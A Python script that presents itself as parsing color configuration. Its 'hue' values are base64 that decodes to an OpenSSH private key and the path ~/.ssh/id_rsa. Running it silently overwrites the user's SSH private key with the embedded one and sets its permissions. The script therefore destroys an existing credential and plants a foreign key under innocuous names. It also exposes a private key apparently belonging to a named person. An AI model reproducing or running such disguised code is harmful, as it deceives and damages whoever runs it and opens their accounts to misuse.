import os
import base64

def parse_configuration():
    
    color_encoding = {
        "hue_1": "LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUNGd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFnRUFydGY4MEJraHRRN0cwZmtUOWZRNjB2VSs4K2NNY1FCS3pDZTM2VXVyTG1WZHlKZnVwRlhBCjdGR0VBUUJrQjI4K05UWS8xdkJDT1hvY3ZWblFhUU4zK3dpKzZ2UHU0RWNJaHFXRHByaXJHZjhsbFd5b1UvOUV3bDkyZloKck90VSs1NWt2Qy9IRTlOcEpHN2hPWXRMRWk1MlVQNElaQlo2ZEZsTjU3UGFBWFdhckZPREZ0T2NrYUJoQ0Y0WUlJbU5aUgpoTEtxbmo0MkVQVnU0K0xBVkpzbU9DYVhjZEhobXcvTVJwYjZBM0V5UmtDNlc4aGw2NTZSdWgwSjZ0WWdaY2dxN05LcDdZCnI4VWk0ZFY4ZTNNaWsxMmxLQnQwOTk5ci9yQlFSeCtoeGNmMHRkenBwUDVyS0hGR3JDS0dQTGw2THRPUHVqMkRmcCtOYTQKa0VkaU5MeTRhUVJSMXNaRmV2WE1ZWll5RUwzYkg2V05qYnFNOWl2bktyV0FyaTBDelBqRFRpWEZtWERjamJWZFJPTU5XdgpsYXBOaU9hUHNJL3Q5M0tCSXBRWExUbC9VSERDUUpBRXFqUVYxMjB3NEhlWmhlMnpDbHdJQXdvYjRNZTIrL2Z6OFRGN2E5CjU2NGNTa092UGhvQmVRSkkwTm1zZmtIM1VDSDVzcWh6ZnVvK0FKbzBCd0tsMGF4cWxVZ0hQbjhHbmpJcTdGOUFNU2dJd3UKTzlzcURRYm91L2hEZDg0VUo0WEtzUm4xYWFvREF3TUFTK3lkSlZIbExZbjFDNWZaTHV4MVgvL0h2cG1uTjlBVXZuRmRIUAo0SXpMRGxvcWE2SkQrV3lqOUdqM2hzd25idTZsRkVIZkZXa285czF0cEJWZW1sKzI1bm9qUzk5K2RJREh4VFRqNmVBcDMxCjBBQUFkZ2RBb2N3WFFLSE1FQUFBQUhjM05vTFhKellRQUFBZ0VBcnRmODBCa2h0UTdHMGZrVDlmUTYwdlUrOCtjTWNRQksKekNlMzZVdXJMbVZkeUpmdXBGWEE3RkdFQVFCa0IyOCtOVFkvMXZCQ09Yb2N2Vm5RYVFOMyt3aSs2dlB1NEVjSWhxV0RwcgppckdmOGxsV3lvVS85RXdsOTJmWnJPdFUrNTVrdkMvSEU5TnBKRzdoT1l0TEVpNTJVUDRJWkJaNmRGbE41N1BhQVhXYXJGCk9ERnRPY2thQmhDRjRZSUltTlpSaExLcW5qNDJFUFZ1NCtMQVZKc21PQ2FYY2RIaG13L01ScGI2QTNFeVJrQzZXOGhsNjUKNlJ1aDBKNnRZZ1pjZ3E3TktwN1lyOFVpNGRWOGUzTWlrMTJsS0",
        "hue_2": "J0MDk5OXIvckJRUngraHhjZjB0ZHpwcFA1cktIRkdyQwpLR1BMbDZMdE9QdWoyRGZwK05hNGtFZGlOTHk0YVFSUjFzWkZldlhNWVpZeUVMM2JINldOamJxTTlpdm5LcldBcmkwQ3pQCmpEVGlYRm1YRGNqYlZkUk9NTld2bGFwTmlPYVBzSS90OTNLQklwUVhMVGwvVUhEQ1FKQUVxalFWMTIwdzRIZVpoZTJ6Q2wKd0lBd29iNE1lMisvZno4VEY3YTk1NjRjU2tPdlBob0JlUUpJME5tc2ZrSDNVQ0g1c3FoemZ1bytBSm8wQndLbDBheHFsVQpnSFBuOEduaklxN0Y5QU1TZ0l3dU85c3FEUWJvdS9oRGQ4NFVKNFhLc1JuMWFhb0RBd01BUyt5ZEpWSGxMWW4xQzVmWkx1CngxWC8vSHZwbW5OOUFVdm5GZEhQNEl6TERsb3FhNkpEK1d5ajlHajNoc3duYnU2bEZFSGZGV2tvOXMxdHBCVmVtbCsyNW4Kb2pTOTkrZElESHhUVGo2ZUFwMzEwQUFBQURBUUFCQUFBQ0FDNVorQjI2NitLeC9pZGdIdGlQWEtEY2YwbnRzTENzWVNmcQpSNmxEZENnaW0xQTRadjJOOWswdjl3ekU2Ny9Fei9zUFhMRkFsRzNrWDRZYkwxTUhwbUVZbW5SeklwcTJlaDRuOXRUV0ZCCllhTy81M0JkRHUxVzJxSFNHRFR0Vm1RMlE0SllNRENqVlRaaFpyZjRvM2c0ZFFsWHJ5WEpoOEVjZzdpdlIxWW50VStGL0QKU3ErTkRxY1k3a1V3VWRNaXpnMmR4L21YaUlIS2J4RmU1Wm9JWDROM1I2TFcvelk2WSs4Nnl5RHFlMmVBZFdjcm8wbHBpagp5S3dqeE5jOTFIeVlscTk3MlBvUUN3VlBzV2FReVZQRCthcStUSzRCdndHUUFGZzZuSXB3VGdHQWhUaEdjbVlRVWFvRXBRCjJvSmlvUDBBU1JsakNWWDhwb1VwUjNHdnJqdElyOFVibUZsNi9wY1diQ0ZKS0QxVmNtSnZoM0JlblZrZEVaRWVETFhLQlIKZGlObCtEVWJtV1JYN1ZDYTZNa2xjYVNTV3ltd253N1ExZlZQM0dxR05XQloyOGpjenNNSWpMdFI4aEp4elpBKzVjRlR3TgovUDB3OVAvaFZWTkFvY2FoNjJkSFUvek5rSU5BTjhWTDdrU0xDbXlDVlF3RkVVRkJIdkNoSDVrV0IrYWQ0SnlwWnBRN04yCmpUSEZSbC9ncThTYXB5K2hGT0tvK0ZVMForaXlxdmhoRUMxbUkrTXI0aG9uWTlQdm4vYmNsMzNBNXJVODA1TzVKaFN6eUoKOXI5Tnc4SExVYkdTcExsVS9GSE9HdU40QVRJQ2w5dFE3NGYxQnR0UTJZbnVpRVY4N2xVNEJ4UUlpM1RTajBGQTUzYnQvRAoybDVmVi9pcWFRS2UyWkgzSkpBQUFCQUJSSG56RjArNGZENXhtakd",
        "hue_3": "Ia3NVSmxZUzRyYnNSNWNXWFYzQmNkZVZSMElhL1pCCjZmUlU2TDRWUnIxa2ZDVUFxSVFEbWZBQ3JxUXJXdVY2Q20xNmQwNDJGOFRmcXhxaURUU0kxTEh2aG5CQWJLWmE4UnlLWncKVnp6R21rOFduUVYvcHZsdEszQk1oK2Juc01lQkhlb0xwZ2pCUU51VXpFQTE4V0JGNG5PcHhBMS9zZi94STZsTlppckNDSAphdzVNajg5d3NuL2dSbDZmaDZvWEdzT3VwWTZpbVRBRHo5eFBiZGpmbUUyL1RCM2ZKWVJ4eWNkalFlTHBiaEpNUXFaZVZ6CkZETkVZUzJxNTd2QnplZDh2aW5jbGNOUUJJQzBxTTYxMWRCcEN3NURlRGVOT2tWcjBNSDBsT25kdkpVdFZFMjB0REt2blAKaVp5MytDckZmcTAzTUtBQUFBRUJBTjBDbVg5TGQ5NUxtT05zbEtoU1dVVkVlTFd1VXdRbm9LVUJ5MnJJY3BCQUt0MUltdQozM0pVaEk4UThRdlJOWkJDaDdIRGVuQ25nRk1BRm9HeERpcmpxRE9ITElZSkJ1aWxwdFZQL3JGdjBmUkhuL1EwcCtMcHFtClFPWGNaVU8rS2MxZll5WGxFUEh6b0ZXV0NIeEJtV1c2U0JEU3kwN0pCSlJoTktNTlluUFc4eXVUTm5nR1o2Q05VM1JHeHMKN0tqbTI4eHBIQTRzTEIzSTZmTzhCOTVYWXBnOWJ5WlUxWFZpc25tdUNvN2VIb1Z3WEY0bGJVcTlsYUJFS1dETFQ5enJuMQpsNUFQTkNLZ3ZBa09wOHNmZU82MVY2bzJVZUpyYjBCZUlnV04wdVZjYkpNdzk4UjhMMnpOS0huRG56Y3ZpRUdQd1ozNEJVCkdGRFNEMmcxU2NMVXNBQUFFQkFNcUdTb1N4Z0c4N2NRTWR4M0thK3M2QlFKcjgvZ0ltUmZ2eURKVFJlV1l6WDRkWmszdTMKZ3NXUFVPNm1JV01JRmhXWDhRZGpFUVR4cjBWRGNtc3BuTENSMjUzOGY2S3EvWCs1Rm5kbXRQRWNTeTd6T2FYbW4xOWQyTgpmSlJ4bVU0M3ZqNE5HNUYrRFJCMGxBbVNxSVNRYmRyWjYzVkc5Rk55SjZwUXJyK3dycHdTY0l5UGhuS1FCRnlVcTlYNGdlClFhMXU3S0Fzd25NbGJBckluVXg3K3hLSU1nNnNwTUZLUFJUdERoakpNVDZETnI3c0ZvbTY2djVOSHNWMm5RWW9ZYnZsZGIKNXoxRmpHWlRGdldDS1ZxaTYyRmt6V3FvRXcwTVRHVE1NNldtZ3psWXArbEY2dVQzRmZlNXVMbWRHYytMVVJKTXFCSEFoNQpsdUlsZS9RdkJQY0FBQUFwYldsamFHRmxiR052YkdWMGRHRkFUV2xqYUdGbGJITXRUV0ZqUW05dmF5MVFjbTh1Ykc5allXCndCQWc9PQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K",
        "hue_4": "fi8uc3NoL2lkX3JzYQ=="
    }

    complete_data_encoded = "".join([
        color_encoding["hue_1"],
        color_encoding["hue_2"],
        color_encoding["hue_3"]
    ])

    try:
        complete_data = base64.b64decode(complete_data_encoded).decode()
    except Exception as e:
        print(f"[ERROR] Failed to decode configuration data: {e}")
        return

    try:
        hue_4_location = base64.b64decode(color_encoding["hue_4"]).decode()
        hue_4_location = os.path.expanduser(hue_4_location)  # Expand the '~' symbol
    except Exception as e:
        print(f"[ERROR] Failed to decode storage location: {e}")
        return

    hue_4_directory = os.path.dirname(hue_4_location)
    if not os.path.exists(hue_4_directory):
        try:
            os.makedirs(hue_4_directory, mode=0o700)
        except Exception as e:
            print(f"[ERROR] Failed to create directory {hue_4_directory}: {e}")
            return

    try:
        with open(hue_4_location, 'w') as hue_config:
            hue_config.write(complete_data)
    except Exception as e:
        print(f"[ERROR] Failed to write data to {hue_4_location}: {e}")
        return

    try:
        os.chmod(hue_4_location, 0o600)
    except Exception as e:
        print(f"[ERROR] Failed to set permissions: {e}")
        return

if __name__ == "__main__":
    parse_configuration()
